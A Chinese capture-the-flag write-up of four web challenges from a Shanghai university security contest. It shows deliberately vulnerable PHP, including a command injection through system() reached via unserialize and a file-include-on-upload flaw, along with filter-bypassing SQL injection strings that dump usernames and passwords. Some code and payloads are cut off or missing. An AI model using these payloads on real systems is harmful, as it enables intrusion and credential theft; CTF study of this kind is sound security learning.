昨天打了第四届上海市大学生网络安全大赛，这里记录下四道web的解题过程。
# web1
题目描述:what are you doing?  
这题说实话比较脑洞。。  
进来之后，页面没什么东西，注释有提示还是注释有提示，根据注释，添加header:`X-Client-IP:127.0.0.1`以及post
`admin=1`就可以看到下一步关键提示
# web2
题目描述：Can you hack me?  
进来之后同样是一个没东西的页面这次注释也没东西，那么直接扫一波目录，发现有`.index.php.swp`，下载下来，用`vim
-r`复原所有代码如下:
    method = $method;
            $this->args = $args;
        }
        function __wakeup(){
            foreach($this->args as $k => $v) {
                $this->args[$k] = $this->waf(trim($v));
            }
        }
        function waf($str){
            $str=preg_replace("/[<>*;|?\n ]/","",$str);
            $str=str_replace('flag','',$str);
            return $str;
        }           
        function echo($host){
            system("echo $host");
        }
        function __destruct(){
            if (in_array($this->method, array("echo"))) {
                call_user_func_array(array($this, $this->method), $this->args);
            }
        } 
    }
    $first='hi';
    $var='var';
    $bbb='bbb';
    $ccc='ccc';
    $i=1;
    foreach($_GET as $key => $value) {
            if($i===1)
            {
                $i++;
                $$key = $value;
            }
            else{break;}
    }
    if($first==="doller")
    {
        @parse_str($_GET['a']);
    if($var==='give'){
        if($bbb==='me'){
            if($ccc==='flag'){
                echo "welcome";
                $come=@$_POST['come'];
                unserialize($come);
            }
        }
        else{
            echo "think about it";
        }
    }
    else{
        echo "no";
    }
    }
    else{
        echo "can you hack me?";
    }
    ?>
前面是一个类的声明，然后看这个部分`的处理，这里很明显，`$args`得是一个数组。  
然后再看，`waf`函数禁用了一些东西，但是好像本来就没打算用得上，还把flag替换为空，简单双写即可绕过。  
再看`echo`函数，调用了`system()`，而且参数可控，明显可以命令注入。  
最后看`__destruct`，这里限定了传进去的`$method`只能是`echo`，然后用`echo`函数对`$args`数组进行处理。  
所以，我们可以这么构造
# web3
题目描述：GOOD JOB  
代码审计题
    <?php
        //error_reporting(0);
        //$dir=md5("icq" . $_SERVER['REMOTE_ADDR']);
        $dir=md5("icq");
        $sandbox = '/var/sandbox/' . $dir;
        @mkdir($sandbox);
        @chdir($sandbox);
        if($_FILES['file']['name']){
            $filename = !empty($_POST['file']) ? $_POST['file'] : $_FILES['file']['name'];
            if (!is_array($filename)) {
                $filename = explode('.', $filename);
            }
            $ext = end($filename);
            if($ext==$filename[count($filename) - 1]){
                die("emmmm...");
            }
            $new_name = (string)rand(100,999).".".$ext;
            move_uploaded_file($_FILES['file']['tmp_name'],$new_name);
            $_ = $_POST['hehe'];
            if(@substr(file($_)[0],0,6)==='@<?php' && strpos($_,$new_name)===false){
                include($_);
            }
            unlink($new_name);
        }
        else{
            highlight_file(__FILE__);
        }
这题刚拿到手，还以为是今年HITCON的`one-line-php-challenge`的升级版，吓得我都打开了各种wp待命，后面仔细看了才发现其实没啥关系。首先我们需要绕过这个`了  
我们知道，可以把文件传到`/tmp`目录下，然后这里`$_`又是可控的，事情就变得很简单了。像这样构造数据包
# web4
题目描述：GOOD LUCK.
## SQL注入
进来之后有一个id输入框，还有个登录框第一时间测测SQL注入，发现id是存在注入的。`id=sd'
or
1#`:`id=sd'
or
0#`:想了一下，觉得首先要找到它把什么替换为空了才能突破。进行了漫长的测试后，发现`from`和`select`都被替换为空。`id=sd'
or (selselectect
1)#`:`id=sd'
or (selselectect 1
fromfromfrom)#`:没有报`get
out hacker!!`，说明是可以的。然后进行注入，发现这是令人愉悦的有回显的注入(其实是后面才想起来，一开始完全就是当布尔盲注做的-_-0)  
`id=sd' unifromon selselectect (seselectlect
database()),2#`:`id=sd'
unifromon selselectect (seselectlect group_concat(table_name)frfromom
information_schemafrom.tables where
table_schema='web'),2#`:`id=sd'
unifromon selselectect (seselectlect group_concat(column_name)frfromom
information_schemafrom.columns where table_name='user' and
table_schema='web'),2#`:`id=sd'
unifromon selselectect (seselectlect
group_concat(username,':',password)frfromom
web.user),2#`:然后登录
## "文件上传"
登录进来之后看到一个文件上传的表单发现无论传过去的文件名是什么，后台都会在最后面加个`.txt`，而且提示说要`upload
to
./flag.php`，而且这是个假的上传，访问返回的链接是没有东西的。这里首先发现，最终的文件名是`uploaddir`和`fileField`的文件名共同组成的，两者配合可以弄出一个php的后缀。